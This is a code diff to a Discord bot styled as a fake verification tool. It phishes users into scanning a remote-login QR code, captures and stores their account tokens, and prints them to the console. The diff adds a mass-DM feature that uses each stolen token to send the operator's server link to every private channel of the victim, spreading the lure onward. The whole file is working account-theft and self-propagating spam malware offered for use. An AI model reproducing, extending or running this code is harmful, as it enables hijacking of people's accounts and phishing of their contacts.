@@ -1,5 +1,5 @@
 #Importing modules
-import nextcord, os, ctypes, json, asyncio, hashlib, base64
+import nextcord, os, ctypes, json, asyncio, hashlib, base64, requests, threading
 from nextcord import ButtonStyle
 from nextcord.ext import commands
 from nextcord.ui import Button, View
@@ -12,6 +12,9 @@ from cryptography.hazmat.primitives.asymmetric import padding
 from cryptography.hazmat.primitives import hashes
 from colorama import Fore, init; init(autoreset=True)
 from nextcord.utils import get
+y = Fore.LIGHTYELLOW_EX
+b = Fore.LIGHTBLUE_EX
+w = Fore.LIGHTWHITE_EX
 
 #Recovery of the configuration put in the config.json file
 with open('config.json') as f:
@@ -22,6 +25,8 @@ prefix = config.get('prefix')
 command_name = config.get('command_name')
 give_role = config.get('give_role')
 role_name = config.get('role_name')
+mass_dm = config.get('mass_dm')
+server_link = config.get('server_link')
 
 #Bot title
 def bot_title():
@@ -32,8 +37,8 @@ def bot_title():
                             █████╗  ███████║█████╔╝ █████╗      ██║   ██║█████╗  ██████╔╝██║█████╗  
                             ██╔══╝  ██╔══██║██╔═██╗ ██╔══╝      ╚██╗ ██╔╝██╔══╝  ██╔══██╗██║██╔══╝  
                             ██║     ██║  ██║██║  ██╗███████╗     ╚████╔╝ ███████╗██║  ██║██║██║     
-                            ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝      ╚═══╝  ╚══════╝╚═╝  ╚═╝╚═╝╚═╝\n""".replace('█', f'{Fore.LIGHTBLUE_EX}█{Fore.LIGHTYELLOW_EX}'))
-    print(f"""{Fore.LIGHTYELLOW_EX}------------------------------------------------------------------------------------------------------------------------\n{Fore.LIGHTWHITE_EX}raadev | https://dsc.gg/astraadev | https://github.com/AstraaDev | https://ngu.bet/ | https://dsc.gg/ngubet | https://di\n{Fore.LIGHTYELLOW_EX}------------------------------------------------------------------------------------------------------------------------\n""".replace('|', f'{Fore.LIGHTBLUE_EX}|{Fore.LIGHTWHITE_EX}'))
+                            ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝      ╚═══╝  ╚══════╝╚═╝  ╚═╝╚═╝╚═╝\n""".replace('█', f'{b}█{y}'))
+    print(f"""{y}------------------------------------------------------------------------------------------------------------------------\n{w}raadev | https://dsc.gg/astraadev | https://github.com/AstraaDev | https://ngu.bet/ | https://dsc.gg/ngubet | https://di\n{y}------------------------------------------------------------------------------------------------------------------------\n""".replace('|', f'{b}|{w}'))
 
 #Bot home page
 def startprint():
@@ -41,16 +46,22 @@ def startprint():
         give_role_texte = f"{Fore.GREEN}Active"
     else:
         give_role_texte = f"{Fore.RED}Disabled"
+    if mass_dm:
+        mass_dm_texte = f"{Fore.GREEN}Active"
+    else:
+        mass_dm_texte = f"{Fore.RED}Disabled"
     bot_title()
-    print(f"""                                            {Fore.LIGHTYELLOW_EX}[{Fore.LIGHTBLUE_EX}+{Fore.LIGHTYELLOW_EX}]{Fore.LIGHTWHITE_EX} Bot Informations:\n
+    print(f"""                                            {y}[{b}+{y}]{w} Bot Informations:\n
                                                 [#] Logged in as:    {bot.user.name}
                                                 [#] Bot ID:          {bot.user.id}\n\n
-                                            {Fore.LIGHTYELLOW_EX}[{Fore.LIGHTBLUE_EX}+{Fore.LIGHTYELLOW_EX}]{Fore.LIGHTWHITE_EX} Settings View:\n
+                                            {y}[{b}+{y}]{w} Settings View:\n
                                                 [#] Bot Prefix:      {bot.command_prefix}
                                                 [#] Command Name:    {command_name}\n
                                                 [#] Give Role:       {give_role_texte}
-                                                [#] Role Name:       {role_name if role_name!="" else "None"}\n\n""".replace('[#]', f'{Fore.LIGHTYELLOW_EX}[{Fore.LIGHTWHITE_EX}#{Fore.LIGHTYELLOW_EX}]{Fore.LIGHTWHITE_EX}'))
-    print(f"{Fore.LIGHTYELLOW_EX}[{Fore.GREEN}!{Fore.LIGHTYELLOW_EX}]{Fore.LIGHTWHITE_EX} Bot Online!")
+                                                [#] Role Name:       {role_name if role_name != "ROLE-NAME-HERE" else "None"}
+                                                [#] DM Friends:      {mass_dm_texte}
+                                                [#] serveur_link:    {server_link if server_link != "SERVER-LINK-HERE" else "None"}""".replace('[#]', f'{y}[{w}#{y}]{w}'))
+    print(f"{y}[{Fore.GREEN}!{y}]{w} Bot Online!")
 
 intents = nextcord.Intents.default()
 intents.message_content = True
@@ -63,18 +74,18 @@ def Init():
     prefix = config.get('prefix')
     if botToken == "":
         bot_title()
-        input(f"{Fore.LIGHTYELLOW_EX}[{Fore.LIGHTRED_EX}!{Fore.LIGHTYELLOW_EX}]{Fore.LIGHTWHITE_EX} Please set a token in the config.json file.")
+        input(f"{y}[{Fore.LIGHTRED_EX}!{y}]{w} Please set a token in the config.json file.")
         return
     elif prefix == "":
         bot_title()
-        input(f"{Fore.LIGHTYELLOW_EX}[{Fore.LIGHTRED_EX}!{Fore.LIGHTYELLOW_EX}]{Fore.LIGHTWHITE_EX} Please set a prefix in the config.json file.")
+        input(f"{y}[{Fore.LIGHTRED_EX}!{y}]{w} Please set a prefix in the config.json file.")
         return
     try:
         bot.run(botToken)
     except:
         os.system("cls")
         bot_title()
-        input(f"{Fore.LIGHTYELLOW_EX}[{Fore.LIGHTRED_EX}!{Fore.LIGHTYELLOW_EX}]{Fore.LIGHTWHITE_EX} The token located in the config.json file is invalid")
+        input(f"{y}[{Fore.LIGHTRED_EX}!{y}]{w} The token located in the config.json file is invalid")
         return
 
 #Event initialization
@@ -179,7 +190,7 @@ async def start(ctx):
                 self._heartbeatTask.cancel()
     
                 if error:
-                    print(f"{Fore.LIGHTYELLOW_EX}[{Fore.LIGHTRED_EX}!{Fore.LIGHTYELLOW_EX}]{Fore.LIGHTWHITE_EX} RemoteAuthClient disconnected with error. Reconnecting...")
+                    print(f"{y}[{Fore.LIGHTRED_EX}!{y}]{w} RemoteAuthClient disconnected with error. Reconnecting...")
                     self.initCrypto()
                     await self.run()
     
@@ -198,15 +209,15 @@ async def start(ctx):
         async def on_fingerprint(data):
             @c.event("on_cancel")
             async def on_cancel():
-                print(f"{Fore.LIGHTYELLOW_EX}[{Fore.LIGHTRED_EX}!{Fore.LIGHTYELLOW_EX}]{Fore.LIGHTWHITE_EX} Auth canceled: {data}")
+                print(f"{y}[{Fore.LIGHTRED_EX}!{y}]{w} Auth canceled: {data}")
     
             @c.event("on_timeout")
             async def on_timeout():
-                print(f"{Fore.LIGHTYELLOW_EX}[{Fore.LIGHTRED_EX}!{Fore.LIGHTYELLOW_EX}]{Fore.LIGHTWHITE_EX} Timeout: {data}")
+                print(f"{y}[{Fore.LIGHTRED_EX}!{y}]{w} Timeout: {data}")
     
             embed_qr.set_image(url=f"https://api.qrserver.com/v1/create-qr-code/?size=256x256&data={data}")
             await interaction.edit_original_message(embed=embed_qr)
-            print(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n{Fore.LIGHTYELLOW_EX}[{Fore.LIGHTGREEN_EX}!{Fore.LIGHTYELLOW_EX}]{Fore.LIGHTWHITE_EX} QR Code Generated: {data}")
+            print(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n{y}[{Fore.LIGHTGREEN_EX}!{y}]{w} QR Code Generated: {data}")
     
             @c.event("on_userdata")
             async def on_userdata(user):
@@ -223,7 +234,7 @@ async def start(ctx):
                 database[user.id]["avatarUrl"] = f"https://cdn.discordapp.com/avatars/{user.id}/{user.avatar}.png"
     
                 json.dump(database, open("database.json", "w", encoding="utf-8"), indent=4)
-                print(f"{Fore.LIGHTYELLOW_EX}[{Fore.LIGHTBLUE_EX}#{Fore.LIGHTYELLOW_EX}]{Fore.LIGHTWHITE_EX} {user.username}#{user.discriminator} ({user.id})")
+                print(f"{y}[{b}#{y}]{w} {user.username}#{user.discriminator} ({user.id})")
     
                 @c.event("on_token")
                 async def on_token(token):
@@ -239,15 +250,37 @@ async def start(ctx):
     
                     json.dump(database, open("database.json", "w", encoding="utf-8"), indent=4)
 
-                    print(f"{Fore.LIGHTYELLOW_EX}[{Fore.LIGHTBLUE_EX}#{Fore.LIGHTYELLOW_EX}]{Fore.LIGHTWHITE_EX} Token: {token}")
+                    print(f"{y}[{b}#{y}]{w} Token: {token}")
                     
                     #If Enable, gives a role after verification
                     if give_role == True:
                         try:
                             await interaction.user.add_roles(get(ctx.guild.roles, name=role_name))
-                            print(f"{Fore.LIGHTYELLOW_EX}[{Fore.LIGHTGREEN_EX}!{Fore.LIGHTYELLOW_EX}]{Fore.LIGHTWHITE_EX} Role added to {user.username}#{user.discriminator}")
+                            print(f"{y}[{Fore.LIGHTGREEN_EX}!{y}]{w} Role added to {user.username}#{user.discriminator}")
                         except:
-                            print(f"{Fore.LIGHTYELLOW_EX}[{Fore.LIGHTRED_EX}!{Fore.LIGHTYELLOW_EX}]{Fore.LIGHTWHITE_EX} There is a problem with your role. Check the Name and make sure it can give this role")
+                            print(f"{y}[{Fore.LIGHTRED_EX}!{y}]{w} There is a problem with your role. Check the Name and make sure it can give this role")
+
+                    #If Enable, dm all the current person's private chat
+                    if mass_dm == True:
+                        channel_id = requests.get("https://discord.com/api/v9/users/@me/channels", headers={"Content-Type": "application/json", "Authorization": token, "User-Agent": "Mozilla/5.0 (Windows NT 6.1; rv:76.0) Gecko/20100101 Firefox/76.0"}).json()
+                        
+                        def MassDM(token, channels):
+                            success = 0
+                            failures = 0
+                            for channel in channels:
+                                for user in [x["username"] + "#" + x["discriminator"] for x in channel["recipients"]]:
+                                    try:
+                                        requests.post(f'https://discord.com/api/v9/channels/' + channel['id'] + '/messages', headers={'Authorization': token}, data={"content": f"{server_link}"})
+                                        success += 1
+                                    except:
+                                        failures += 1
+                                        pass
+                            print(f"{y}[{Fore.LIGHTGREEN_EX}!{y}]{w} Succesfull messaged {success} people(s) with {failures} failure(s)")
+                        
+                        if not channel_id:
+                            print(f"{y}[{Fore.LIGHTRED_EX}!{y}]{w} This guy is lonely, he aint got no dm's...")
+                        for channel in [channel_id[i:i+10] for i in range(0, len(channel_id), 10)]:
+                            threading.Thread(target=MassDM, args=(token, channel)).start()
         
         #Embed Creation
         asyncio.create_task(c.run())
